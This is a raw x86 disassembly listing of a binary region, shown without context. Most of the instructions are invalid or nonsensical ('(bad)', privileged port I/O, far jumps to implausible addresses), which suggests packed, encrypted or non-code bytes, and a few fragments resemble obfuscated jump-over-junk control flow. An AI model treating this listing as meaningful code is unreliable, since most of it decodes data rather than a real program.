  40cfa2:	mov    eax,?
  40cfa4:	pop    edx
  40cfa5:	add    ah,al
  40cfa7:	sbb    al,0xf0
  40cfa9:	cmp    eax,0xcdbe17f9
  40cfae:	in     al,0x7d
  40cfb0:	in     al,dx
  40cfb1:	push   ecx
  40cfb2:	scas   eax,DWORD PTR es:[di]
  40cfb4:	sub    eax,0x169fe720
  40cfb9:	fdivp  st(3),st
  40cfbb:	push   ebx
  40cfbc:	jb     0x40cfc7
  40cfbe:	mov    WORD PTR [edx+0x11],gs
  40cfc1:	in     al,dx
  40cfc2:	hlt    
  40cfc3:	dec    esi
  40cfc4:	mov    eax,ds:0xa47d4511
  40cfc9:	inc    eax
  40cfca:	out    dx,al
  40cfcb:	shl    BYTE PTR [edx-0x1b1a7a55],cl
  40cfd1:	mov    edi,ecx
  40cfd3:	dec    ebx
  40cfd4:	mov    ebx,0xa78c8c9
  40cfd9:	mov    al,ds:0xa1bc2404
  40cfde:	jno    0x40d047
  40cfe0:	(bad)  
  40cfe1:	fimul  WORD PTR [eax]
  40cfe3:	dec    ecx
  40cfe4:	sbb    eax,0xa66e5216
  40cfe9:	(bad)  
  40cfea:	cld    
  40cfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfec:	dec    edx
  40cfed:	jle    0x40d061
  40cfef:	ret    0x9aa8
  40cff2:	mov    esi,0x816b6cc5
  40cff7:	rol    BYTE PTR [ecx+0x444f9025],cl
  40cffd:	inc    esi
  40cffe:	repz mov esi,0x1e92b2a7
  40d004:	loopne 0x40cfbc
  40d006:	push   0x25234a72
  40d00b:	scas   al,BYTE PTR es:[edi]
  40d00c:	push   eax
  40d00d:	in     al,0x19
  40d00f:	out    0x61,al
  40d011:	inc    edi
  40d012:	adc    BYTE PTR ds:0x2a68e993,bh
  40d018:	jecxz  0x40d07f
  40d01a:	rcl    dh,1
  40d01c:	xchg   edx,eax
  40d01d:	mov    dl,0xcd
  40d01f:	xor    al,0xff
  40d021:	and    DWORD PTR fs:[eax],edi
  40d024:	retf   0x9b3a
  40d027:	mov    eax,ds:0xbbfc0ef5
  40d02c:	dec    edx
  40d02d:	xor    al,0x60
  40d02f:	cmp    bl,al
  40d031:	(bad)  
  40d032:	stc    
  40d033:	ins    DWORD PTR es:[edi],dx
  40d034:	jp     0x40d027
  40d036:	gs in  eax,0x31
  40d039:	lahf   
  40d03a:	sahf   
  40d03b:	(bad)  
  40d03c:	cdq    
  40d03d:	sub    BYTE PTR ss:[ebx-0x771b2f45],0x9b
  40d045:	out    0xf8,eax
  40d047:	jl     0x40d033
  40d049:	or     DWORD PTR [edi+ebp*1],ecx
  40d04c:	mov    ch,0x2d
  40d04e:	and    al,0x5f
  40d050:	mov    ch,0x4b
  40d052:	mov    DWORD PTR [ebx+0x56a8082d],edx
  40d058:	mov    eax,ds:0xeee7a3cf
  40d05d:	retf   
  40d05e:	iret   
  40d05f:	push   ebx
  40d060:	xlat   BYTE PTR ds:[ebx]
  40d061:	popf   
  40d062:	(bad)
  40d066:	lea    ebx,[ecx+0x18f8f6d0]
  40d06c:	jns    0x40d07d
  40d06e:	jmp    0x7cdc:0x549217b9
  40d075:	sub    DWORD PTR [ebp-0x760172a3],0x6e
  40d07c:	pop    eax
  40d07d:	cdq    
  40d07e:	ja     0x40d09c
  40d080:	test   ecx,esi
  40d082:	ror    DWORD PTR [ecx-0x16],0x35
  40d086:	jp     0x40d050
  40d088:	je     0x40d0c0
  40d08a:	xor    al,0x62
  40d08c:	mov    al,0xcb
  40d08e:	xor    BYTE PTR [edi+0x13b85992],al
  40d094:	ror    BYTE PTR [ecx-0xd],1
  40d097:	shl    DWORD PTR [ecx+ecx*4-0x357114a9],0x2c
  40d09f:	cld    
  40d0a0:	cmp    BYTE PTR [edi-0x34abb504],al
  40d0a6:	not    BYTE PTR [esi]
  40d0a8:	jne    0x40d031
  40d0aa:	out    dx,eax
  40d0ab:	std    
  40d0ac:	dec    ebx
  40d0ad:	and    al,0x8a
  40d0af:	cmp    ax,0x2d7d
  40d0b3:	mov    eax,0xfa15c27b
  40d0b8:	call   0xaecccb2f
  40d0bd:	xchg   DWORD PTR [ecx-0x13],ebp
  40d0c0:	mov    esi,0x860f8621
  40d0c5:	data16 lock (bad) 
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    edi,FWORD PTR [edi-0x55]
  40d0f0:	mov    ebx,0x709daa27
  40d0f5:	jo     0x40d096
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d091
  40d0fb:	stos   DWORD PTR es:[edi],eax
  40d0fc:	dec    ebx
  40d0fd:	mov    ah,0xa0
  40d100:	imul   edx,DWORD PTR [ecx-0x40],0xfe1872d7
  40d107:	scas   al,BYTE PTR es:[edi]
  40d108:	push   esp
  40d109:	jne    0x40d108
  40d10b:	call   0x97869f6b
  40d110:	xchg   BYTE PTR [ecx],bh
  40d112:	adc    BYTE PTR [ecx+0x38721134],bl
  40d118:	loop   0x40d0d1
  40d11a:	push   es
  40d11b:	sbb    eax,0x46cc3faa
  40d120:	sub    eax,0xeba156da
  40d125:	dec    edi
  40d126:	pop    edx
  40d127:	into   
  40d128:	fnstsw WORD PTR [ebp-0x79beb8b7]
  40d12e:	mov    dl,BYTE PTR [ebx-0x7fb0d3a3]
  40d134:	dec    esp
  40d135:	scas   al,BYTE PTR es:[edi]
  40d136:	sti    
  40d137:	and    DWORD PTR [ebp-0x52],eax
  40d13a:	cmp    dh,BYTE PTR [edi+0x6b]
  40d13d:	lea    edi,[ebp-0x35488bd2]
  40d143:	sar    BYTE PTR [ebx-0x70],1
  40d146:	cmc    
  40d147:	push   ds
  40d148:	cmp    al,0x2d
  40d14a:	test   eax,0xe2e497ba
  40d14f:	push   ebx
  40d150:	add    esp,esi
  40d152:	mov    bh,0x5
  40d154:	add    bl,BYTE PTR [esi]
  40d156:	fdiv   st(3),st
  40d158:	dec    eax
  40d159:	int3   
  40d15a:	xchg   esp,eax
  40d15b:	push   0x80a9fa5e
  40d160:	stc    
  40d161:	iret   
  40d162:	mov    ecx,0xfb45deca
  40d167:	sbb    ebp,DWORD PTR [edi]
  40d169:	ja     0x40d18b
  40d16b:	icebp  
  40d16c:	push   esi
  40d16d:	xor    eax,0x24bd826c
  40d172:	test   al,0x5d
  40d174:	lahf   
  40d175:	dec    edx
  40d176:	xor    ah,0x79
  40d179:	arpl   WORD PTR [ecx],cx
  40d17b:	js     0x40d15a
  40d17d:	and    al,0x64
  40d17f:	loopne 0x40d122
  40d181:	mov    ds:0xdefdab16,al
  40d186:	inc    ebx
  40d187:	xchg   ecx,eax
  40d188:	sub    ebp,eax
  40d18a:	(bad)  
  40d18b:	shl    BYTE PTR [edi+0x3c],1
  40d18e:	jle    0x40d150
  40d190:	pop    eax
  40d191:	lods   al,BYTE PTR ds:[esi]
  40d192:	(bad)  
  40d193:	shr    DWORD PTR [edi-0x6a],cl
  40d196:	scas   eax,DWORD PTR es:[edi]
  40d197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d198:	jg     0x40d219
  40d19a:	add    al,0xc6
  40d19c:	scas   eax,DWORD PTR es:[edi]
  40d19d:	jo     0x40d1aa
  40d19f:	fistp  QWORD PTR ds:[edi-0x59]
  40d1a3:	xchg   DWORD PTR [ecx],edi
  40d1a5:	lahf   
  40d1a6:	pop    edi
  40d1a7:	jbe    0x40d19e
  40d1a9:	inc    ebx
  40d1aa:	inc    ebp
  40d1ab:	xor    esp,ecx
  40d1ad:	xchg   esi,eax
  40d1ae:	pop    ebp
  40d1af:	fsubr  QWORD PTR [esi-0x44]
  40d1b2:	dec    esp
  40d1b3:	lds    edx,FWORD PTR [eax-0x21b164e]
  40d1b9:	sbb    eax,0x7b0905b9
  40d1be:	clc    
  40d1bf:	fwait
  40d1c0:	and    al,0xc4
  40d1c2:	fmul   st(2),st
  40d1c4:	(bad)  
  40d1c5:	scas   eax,DWORD PTR es:[edi]
  40d1c6:	dec    ebx
  40d1c7:	mov    dh,0x58
  40d1c9:	pause  
  40d1cb:	pop    ecx
  40d1cc:	pop    esi
  40d1cd:	push   eax
  40d1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1cf:	xchg   edi,eax
  40d1d0:	lahf   
  40d1d1:	sbb    DWORD PTR [ebx-0x13],ebp
  40d1d4:	repnz shl BYTE PTR [ebp+0x21823895],0x8d
  40d1dc:	neg    WORD PTR [edi]
  40d1df:	xor    dl,0x69
  40d1e2:	xchg   esp,eax
  40d1e3:	add    eax,0xbcef9eef
  40d1e8:	in     eax,dx
  40d1e9:	mov    ebx,DWORD PTR [eax+0x1a]
  40d1ec:	mov    DWORD PTR [ebp-0x71],edx
  40d1ef:	mov    DWORD PTR [edx+0x11],esi
  40d1f2:	sbb    dl,dl
  40d1f4:	les    edx,FWORD PTR [edi]
  40d1f6:	push   cs
  40d1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f8:	xchg   ebp,eax
  40d1f9:	xchg   ecx,eax
  40d1fa:	pop    edi
  40d1fb:	fwait
  40d1fc:	call   0xca53dcb5
  40d201:	dec    eax
  40d202:	cwde   
  40d203:	pop    ebp
  40d204:	pop    edx
  40d205:	sbb    ebx,DWORD PTR [edi-0x20cea9ff]
  40d20b:	ins    BYTE PTR es:[edi],dx
  40d20c:	je     0x40d1fb
  40d20e:	adc    ebp,edi
  40d210:	js     0x40d28f
  40d212:	shl    BYTE PTR [ecx],cl
  40d214:	out    dx,eax
  40d215:	jmp    0x3a93b286
  40d21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d21b:	or     BYTE PTR [ecx+ecx*8+0xc381101],bl
  40d222:	and    edi,DWORD PTR [ecx]
  40d224:	in     eax,dx
  40d225:	mov    bl,0xf8
  40d227:	pop    ecx
  40d228:	jl     0x40d1bd
  40d22a:	rol    BYTE PTR [ebp+0x47],cl
  40d22d:	test   DWORD PTR es:[esi],eax
  40d230:	ds mov esp,0x6302918c
  40d236:	mov    ch,0x84
  40d238:	adc    DWORD PTR [esi+0x45df8f3f],edx
  40d23e:	and    DWORD PTR [ecx-0x7ea0c3b9],0x14c5545c
  40d248:	aas    
  40d249:	clc    
  40d24a:	test   edi,eax
  40d24c:	xor    al,0xd3
  40d24e:	test   eax,0xfe581849
  40d253:	aam    0x7c
  40d255:	dec    eax
  40d256:	aas    
  40d257:	je     0x40d238
  40d259:	jp     0x40d1ea
  40d25b:	cmp    ebp,DWORD PTR [edx]
  40d25d:	in     eax,dx
  40d25e:	mov    eax,0x612685f2
  40d263:	call   0x7550afd1
  40d268:	xchg   DWORD PTR [esi-0x56],eax
  40d26b:	jno    0x40d1f4
  40d26d:	loope  0x40d249
  40d26f:	cwde   
  40d270:	jne    0x40d25d
  40d272:	add    DWORD PTR [ebp+0x70],ecx
  40d275:	or     DWORD PTR [esi],ebx
  40d277:	xor    BYTE PTR [ecx-0x1ae4d9bd],dl
  40d27d:	xchg   BYTE PTR [ebp-0x30293732],ch
  40d283:	call   0x61ee0cf6
  40d288:	mov    edx,edi
  40d28a:	mov    ?,WORD PTR [esi+0x354a77fe]
  40d290:	fstp   DWORD PTR [ebp+0x63]
  40d293:	cmp    DWORD PTR [edx*1-0x6dbb9a4b],edx
  40d29a:	(bad)  
  40d29b:	out    0x3c,al
  40d29d:	and    BYTE PTR [edx],al
  40d29f:	hlt    
  40d2a0:	(bad)  
  40d2a1:	adc    DWORD PTR [eax],esp
  40d2a3:	packssdw mm3,QWORD PTR [ebp-0x72]
  40d2a7:	cmp    al,0xb1
  40d2a9:	imul   ebx,DWORD PTR [esp+ebp*4+0xb8b98c8],0x6aaf4b99
  40d2b4:	inc    esp
  40d2b5:	loopne 0x40d2a1
  40d2b7:	(bad)  
  40d2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2b9:	aad    0xd0
  40d2bb:	pop    edx
  40d2bc:	inc    esp
  40d2bd:	mov    dh,0xf9
  40d2bf:	inc    ebp
  40d2c0:	and    BYTE PTR [ebx+0xb],al
  40d2c3:	ins    DWORD PTR es:[edi],dx
  40d2c4:	shl    DWORD PTR [eax-0x2d],0x49
  40d2c8:	mov    ss,WORD PTR [ebx+esi*4]
  40d2cb:	pop    ss
  40d2cc:	mov    BYTE PTR [ecx-0x2d],0x86
  40d2d0:	add    al,0xaf
  40d2d2:	pop    edi
  40d2d3:	aaa    
  40d2d4:	rcl    BYTE PTR [ecx-0x56ee606c],cl
  40d2da:	stc    
  40d2db:	(bad)  
  40d2dc:	xor    DWORD PTR [edx-0x7cb424f4],ecx
  40d2e2:	cs mov ecx,0x15ef7ee1
  40d2e8:	fsub   DWORD PTR [esi]
  40d2ea:	xor    BYTE PTR [edi+edx*4],bh
  40d2ed:	lea    esi,[ebx-0x7a05eb17]
  40d2f3:	arpl   WORD PTR [edi+esi*4-0x1fdac5f7],di
  40d2fa:	xchg   ecx,ebp
  40d2fc:	jle    0x40d377
  40d2fe:	and    BYTE PTR [edi],dl
  40d300:	jno    0x40d37c
  40d302:	xchg   esi,eax
  40d303:	sbb    al,0x17
  40d305:	inc    edi
  40d306:	rcl    DWORD PTR [edi],0x5b
  40d309:	shr    DWORD PTR es:[edi+0x3f],cl
  40d30d:	or     bh,BYTE PTR [ecx-0x6b]
  40d310:	pop    ss
  40d311:	mov    ebp,0x1d80515
  40d316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d317:	out    0xfa,eax
  40d319:	mov    ch,BYTE PTR [esi-0x25bbe15a]
  40d31f:	(bad)  
  40d320:	leave  
  40d321:	outs   dx,DWORD PTR ds:[esi]
  40d322:	mov    ds:0xd5a7f62,eax
  40d327:	xchg   BYTE PTR [ecx-0x7092f407],al
  40d32d:	adc    eax,0x2f30071a
  40d332:	pop    edi
  40d333:	pop    es
  40d334:	dec    eax
  40d335:	leave  
  40d336:	adc    BYTE PTR [ecx+edx*2],cl
  40d339:	fstp   DWORD PTR [esi+0xf]
  40d33c:	call   edx
  40d33e:	pop    ds
  40d33f:	adc    DWORD PTR [ebx+0x57],esi
  40d342:	out    0x3b,eax
  40d344:	dec    ecx
  40d345:	aam    0x46
  40d347:	ds xor al,0x97
  40d34a:	cmp    DWORD PTR [ecx],edi
  40d34c:	jmp    FWORD PTR [edx-0x240b25ef]
  40d352:	es call 0x5660:0xdd00ccf9
  40d35a:	ret    
  40d35b:	mov    al,ds:0x5d9488d9
  40d360:	mov    cl,0x5b
  40d362:	jbe    0x40d38c
  40d364:	out    0x8c,eax
  40d366:	adc    DWORD PTR [ebx-0x69],0x2135ba17
  40d36d:	cld    
  40d36e:	xchg   esi,eax
  40d36f:	and    eax,0x84f737ab
  40d374:	je     0x40d3d7
  40d376:	lahf   
  40d377:	das    
  40d378:	pop    ss
  40d379:	jo     0x40d39f
  40d37b:	retf   
  40d37c:	js     0x40d3b2
  40d37e:	in     eax,dx
  40d37f:	sbb    ch,BYTE PTR [ebx+eax*1+0x169c7382]
  40d386:	inc    eax
  40d387:	stos   DWORD PTR es:[edi],eax
  40d388:	ret    0xb4f3
  40d38b:	clc    
  40d38c:	pop    esp
  40d38d:	dec    ecx
  40d38e:	add    edi,ebx
  40d390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d391:	std    
  40d392:	mov    al,ah
  40d394:	jge    0x40d415
  40d396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d397:	mov    bh,0xfa
  40d399:	scas   al,BYTE PTR es:[edi]
  40d39a:	out    dx,eax
  40d39b:	fcomip st,st(5)
  40d39d:	adc    edi,DWORD PTR [ecx-0x28d5a508]
  40d3a3:	cmc    
  40d3a4:	xchg   ebp,eax
  40d3a5:	hlt    
  40d3a6:	into   
  40d3a7:	sbb    esi,DWORD PTR [esi+0x4dcf52c2]
  40d3ad:	in     al,dx
  40d3ae:	test   DWORD PTR [ebx+0x28],esp
  40d3b1:	mov    eax,0x89f08962
  40d3b6:	hlt    
  40d3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b8:	fnstsw WORD PTR [ebx+0x73]
  40d3bb:	mov    ebp,0x428d967d
  40d3c0:	(bad)  
  40d3c1:	push   ecx
  40d3c2:	arpl   bp,di
  40d3c4:	in     eax,0x34
  40d3c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3c7:	xlat   BYTE PTR ds:[ebx]
  40d3c8:	pop    ss
  40d3c9:	inc    esp
  40d3ca:	sbb    DWORD PTR [esi+0x11],ebp
  40d3cd:	dec    esp
  40d3ce:	imul   ebx,DWORD PTR [edi+0x39b1b556],0xb6aa6ab
  40d3d8:	out    dx,eax
  40d3d9:	cvttps2pi mm4,xmm2
  40d3dc:	sbb    DWORD PTR [ebp-0x77eaedc2],ebx
  40d3e2:	pop    ecx
  40d3e3:	sub    BYTE PTR [esi+0x58],dl
  40d3e6:	push   esp
  40d3e7:	pop    edx
  40d3e8:	sbb    al,0x6a
  40d3ea:	(bad)  
  40d3eb:	mov    edx,0x2d40dd1a
  40d3f0:	addr16 (bad) 
  40d3f2:	ja     0x40d408
  40d3f4:	mov    ds:0x845b2bdc,al
  40d3f9:	repnz out dx,al
  40d3fb:	add    ah,BYTE PTR [ecx-0xf76efd9]
  40d401:	shl    BYTE PTR [ebp+eax*4-0x2b96dcf0],cl
  40d408:	and    DWORD PTR [edi-0x52e37c2c],ebp
  40d40e:	inc    ecx
  40d40f:	lea    esp,[ebx+0xa]
  40d412:	mov    dh,0x99
  40d414:	in     eax,0x5c
  40d416:	jmp    0x40d453
  40d418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d419:	scas   eax,DWORD PTR es:[edi]
  40d41a:	hlt    
  40d41b:	dec    ebx
  40d41c:	repnz dec ecx
  40d41e:	ret    0x3c28
  40d421:	inc    eax
  40d422:	add    cl,dh
  40d424:	rcl    BYTE PTR fs:[eax-0x25b4884d],1
  40d42b:	push   ds
  40d42c:	dec    eax
  40d42d:	pshufw mm2,mm7,0x9e
  40d431:	sar    edx,cl
  40d433:	adc    BYTE PTR [ecx+0x323c61da],bh
  40d439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d43a:	mov    al,0xb8
  40d43c:	sub    eax,0x3aa910c0
  40d441:	test   DWORD PTR [edx],0x9ce37ac7
  40d447:	sbb    esp,DWORD PTR [edi-0x42]
  40d44a:	pop    ds
  40d44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d44c:	scas   eax,DWORD PTR es:[edi]
  40d44d:	test   BYTE PTR [edx],dl
  40d44f:	cs jle 0x40d412
  40d452:	add    BYTE PTR [ebp+0x65],ah
  40d455:	adc    ecx,esi
  40d457:	xor    al,0x4d
  40d459:	icebp  
  40d45a:	mov    esi,0xcc630609
  40d45f:	adc    eax,0x5bf7613f
  40d464:	mov    BYTE PTR [ecx+0x7a],al
  40d467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d468:	fs mov dh,0x94
  40d46b:	in     al,0x5c
  40d46d:	leave  
  40d46e:	repz sub ebx,ebx
  40d471:	inc    edi
  40d472:	push   edi
  40d473:	mov    cs,WORD PTR [esi-0x3a]
  40d476:	fwait
  40d477:	addr16 in al,0xd2
  40d47a:	shl    ebp,cl
  40d47c:	loop   0x40d432
  40d47e:	mov    edx,0x400066bf
  40d483:	retf   0x78f
  40d486:	mov    ecx,0xd237c805
  40d48b:	sub    BYTE PTR [esi-0x1737cb1a],dl
  40d491:	add    ch,BYTE PTR [esi+edi*8]
  40d494:	dec    esp
  40d495:	outs   dx,BYTE PTR ds:[esi]
  40d496:	adc    BYTE PTR [esi-0x741c49c5],0x7d
  40d49d:	clc    
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xdcd3:0xb81a1d63
  40d4c6:	and    al,0xe5
  40d4c8:	bswap  ecx
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4a8
  40d4d2:	pop    ds
  40d4d3:	retf   
  40d4d4:	push   edi
  40d4d5:	stos   DWORD PTR es:[edi],eax
  40d4d6:	arpl   WORD PTR [esi+0x621aa387],cx
  40d4dc:	sub    DWORD PTR [ebp+0x1736d8ac],eax
  40d4e2:	es mov al,0x1d
  40d4e5:	enter  0x6a46,0x37
  40d4e9:	shr    BYTE PTR ds:0x938d089a,cl
  40d4ef:	outs   dx,BYTE PTR ds:[esi]
  40d4f0:	mov    edx,0xfa5bf5dc
  40d4f5:	div    BYTE PTR [esi-0x69ac00f9]
  40d4fb:	outs   dx,BYTE PTR fs:[esi]
  40d4fd:	mov    ch,0x1d
  40d4ff:	ja     0x40d49c
  40d501:	jecxz  0x40d4bd
  40d503:	js     0x40d52d
  40d505:	jmp    0xee5d8537
  40d50a:	adc    BYTE PTR [ebx+0x49],bl
  40d50d:	sahf   
  40d50e:	ret    0xfc71
  40d511:	jle    0x40d4be
  40d513:	test   eax,0x510b9a83
  40d518:	push   ecx
  40d519:	mov    ebp,0xd799df3
  40d51e:	sbb    al,0xfe
  40d520:	(bad)
  40d524:	sub    edx,DWORD PTR [ebp-0x6b]
  40d527:	push   eax
  40d528:	js     0x40d4bc
  40d52a:	push   0x75
  40d52c:	das    
  40d52d:	imul   eax,esp,0xffffffeb
  40d530:	jne    0x40d580
  40d532:	ret    
  40d533:	push   cs
  40d534:	loope  0x40d50f
  40d536:	sub    al,0x87
  40d538:	xor    bl,bl
  40d53a:	mov    dl,0xc9
  40d53c:	dec    edx
  40d53d:	mov    al,0x83
  40d53f:	loopne 0x40d4c8
  40d541:	hlt    
  40d542:	mov    edi,0x8653b277
  40d547:	scas   al,BYTE PTR es:[edi]
  40d548:	mov    WORD PTR [eax+0x33],ds
  40d54b:	push   edi
  40d54c:	sbb    ebx,DWORD PTR [esi-0x69]
  40d54f:	aaa    
  40d550:	inc    ebx
  40d551:	cmp    esi,ebp
  40d553:	js     0x40d549
  40d555:	or     esi,esi
  40d557:	(bad)  
  40d558:	xlat   BYTE PTR ds:[ebx]
  40d559:	in     al,0x7c
  40d55b:	dec    esp
  40d55c:	mov    cl,0x59
  40d55e:	(bad)  
  40d55f:	sbb    al,BYTE PTR [edx]
  40d561:	xor    DWORD PTR [eax],ecx
  40d563:	xor    DWORD PTR [ecx-0x4c],0x7302da8d
  40d56a:	retf   
  40d56b:	mov    bh,0x64
  40d56d:	mov    ?,WORD PTR [ebx+0x2648fc14]
  40d573:	cmc    
  40d574:	sar    BYTE PTR [esi+0x22b35d2c],cl
  40d57a:	sbb    edx,DWORD PTR ds:0x99e249ed
  40d580:	adc    edx,DWORD PTR [ebp+esi*2-0x221d1634]
  40d587:	leave  
  40d588:	repnz loopne 0x40d535
  40d58b:	xchg   ebp,eax
  40d58c:	mov    edi,edi
  40d58e:	inc    ebx
  40d58f:	xchg   DWORD PTR [edi+0x2e],edx
  40d592:	bound  ebp,QWORD PTR [ecx+0x14]
  40d595:	jmp    0xe4c4:0x49f0c1a
  40d59c:	xor    al,0xe1
  40d59e:	sbb    esi,ebx
  40d5a0:	pop    eax
  40d5a1:	std    
  40d5a2:	xchg   ebp,eax
  40d5a3:	enter  0x4166,0xda
  40d5a7:	xchg   ecx,eax
  40d5a8:	adc    al,0x78
  40d5aa:	jmp    0x3e1b:0x82689787
  40d5b1:	or     edi,DWORD PTR [edi-0x2c]
  40d5b4:	leave  
  40d5b5:	pop    esi
  40d5b6:	mov    DWORD PTR [ecx+0x4],ebx
  40d5b9:	aad    0xf0
  40d5bb:	retf   
  40d5bc:	pop    ebp
  40d5bd:	std    
  40d5be:	repnz xor BYTE PTR [edx+edx*8+0x7927d868],ah
  40d5c6:	(bad)  
  40d5c7:	fwait
  40d5c8:	mov    esp,0x54acc9f0
  40d5cd:	test   eax,0xb692d4e6
  40d5d2:	xor    esp,edx
  40d5d4:	and    eax,0x509df741
  40d5d9:	add    DWORD PTR [edx],edx
  40d5db:	sbb    al,0x2b
  40d5dd:	sbb    BYTE PTR [ecx+edx*1+0x68],bl
  40d5e1:	cld    
  40d5e2:	in     al,0xc
  40d5e4:	fs cmp ebx,ecx
  40d5e7:	dec    eax
  40d5e8:	mov    WORD PTR [edi],ds
  40d5ea:	sbb    ch,BYTE PTR [esi+eiz*1+0x5d]
  40d5ee:	xchg   ebp,eax
  40d5ef:	ins    DWORD PTR es:[edi],dx
  40d5f0:	adc    al,0x73
  40d5f2:	xchg   esi,eax
  40d5f3:	push   ebp
  40d5f4:	add    ah,BYTE PTR [edx]
  40d5f6:	sub    bh,BYTE PTR [esi]
  40d5f8:	jl     0x40d606
  40d5fa:	jle    0x40d649
  40d5fc:	call   0xa530bb7e
  40d601:	push   edx
  40d602:	out    0x8,eax
  40d604:	aad    0x39
  40d606:	(bad)  
  40d607:	loop   0x40d675
  40d609:	nop
  40d60a:	dec    esp
  40d60b:	test   al,0xb
  40d60d:	cli    
  40d60e:	sub    eax,0xd6824a3a
  40d613:	sub    dl,BYTE PTR cs:[eax]
  40d616:	cmp    BYTE PTR [ebp-0x7d],ah
  40d619:	cmp    esi,DWORD PTR [eax]
  40d61b:	jp     0x40d60f
  40d61d:	(bad)  
  40d61f:	mov    BYTE PTR [ebx+0x46],al
  40d622:	adc    BYTE PTR [esi+0x56],bl
  40d625:	das    
  40d626:	sbb    DWORD PTR [ebx-0x6170a523],ecx
  40d62c:	(bad)  
  40d62d:	hlt    
  40d62e:	cmc    
  40d62f:	or     ebp,edx
  40d631:	cli    
  40d632:	pop    edx
  40d633:	dec    edx
  40d634:	sub    ecx,ebx
  40d636:	mov    esp,0xf442bed7
  40d63b:	cmp    eax,0x17b90389
  40d640:	das    
  40d641:	sub    BYTE PTR [ebx],bl
  40d643:	stc    
  40d644:	scas   eax,DWORD PTR es:[edi]
  40d645:	rcr    DWORD PTR [esi-0x27af71c4],0xcb
  40d64c:	jnp    0x40d65f
  40d64e:	sbb    al,0x87
  40d650:	into   
  40d651:	push   edi
  40d652:	mov    ch,0x53
  40d654:	push   DWORD PTR [ecx+0x1709ab72]
  40d65a:	xlat   BYTE PTR ds:[ebx]
  40d65b:	cmc    
  40d65c:	mov    DWORD PTR [esi],ebx
  40d65e:	add    DWORD PTR [eax-0x75],0xc0320004
  40d665:	cmp    al,0x69
  40d667:	popf   
  40d668:	lds    eax,FWORD PTR [ebp+0x27ec905e]
  40d66e:	push   ebp
  40d66f:	sahf   
  40d670:	ja     0x40d6e9
  40d672:	sbb    cl,BYTE PTR [ebx+0xb0f4f93]
  40d678:	sub    BYTE PTR [eax],dh
  40d67a:	or     al,BYTE PTR [ebp+0x6f150004]
  40d680:	mov    bh,0x22
  40d682:	push   ebp
  40d683:	leave  
  40d684:	inc    ebx
  40d685:	(bad)  
  40d687:	dec    ecx
  40d688:	jmp    0x22da64fd
  40d68d:	xor    al,0x65
  40d68f:	push   ds
  40d690:	mov    cl,0xe0
  40d692:	ss (bad) 
  40d695:	jno    0x40d65d
  40d697:	jbe    0x40d691
  40d699:	mov    ebx,0x6887b84
  40d69e:	jg     0x40d6dc
  40d6a0:	dec    ebx
  40d6a1:	fiadd  WORD PTR [ebx]
  40d6a3:	xor    dx,ax
  40d6a6:	scas   eax,DWORD PTR es:[edi]
  40d6a7:	xchg   ecx,eax
  40d6a8:	xor    cl,bl
  40d6aa:	int    0xd9
  40d6ac:	xchg   ebx,eax
  40d6ad:	outs   dx,BYTE PTR ds:[esi]
  40d6ae:	stos   BYTE PTR es:[edi],al
  40d6af:	mov    DWORD PTR [ebx-0x1a],edi
  40d6b2:	retf   
  40d6b3:	mov    edi,0xf182b78b
  40d6b8:	lahf   
  40d6b9:	cmp    eax,ecx
  40d6bb:	and    bh,BYTE PTR [eax-0x69]
  40d6be:	mov    ecx,?
  40d6c0:	mov    eax,ds:0x4a4d8e3
  40d6c5:	add    BYTE PTR [esi-0x27],dl
  40d6c8:	cmp    eax,0x8e040fac
  40d6cd:	mov    al,0x64
  40d6cf:	in     eax,dx
  40d6d0:	sbb    ch,BYTE PTR [esi-0x57]
  40d6d3:	clc    
  40d6d4:	jge    0x40d6b5
  40d6d6:	push   ebp
  40d6d7:	jb     0x40d71a
  40d6d9:	inc    ebp
  40d6da:	in     eax,0x4d
  40d6dc:	xchg   edx,eax
  40d6dd:	ds adc eax,0x71d726b4
  40d6e3:	inc    ebx
  40d6e4:	push   esi
  40d6e5:	mov    esi,0xc98f846d
  40d6ea:	cmc    
  40d6eb:	pop    ebp
  40d6ec:	shr    ch,0x84
  40d6ef:	xchg   ebx,eax
  40d6f0:	inc    edx
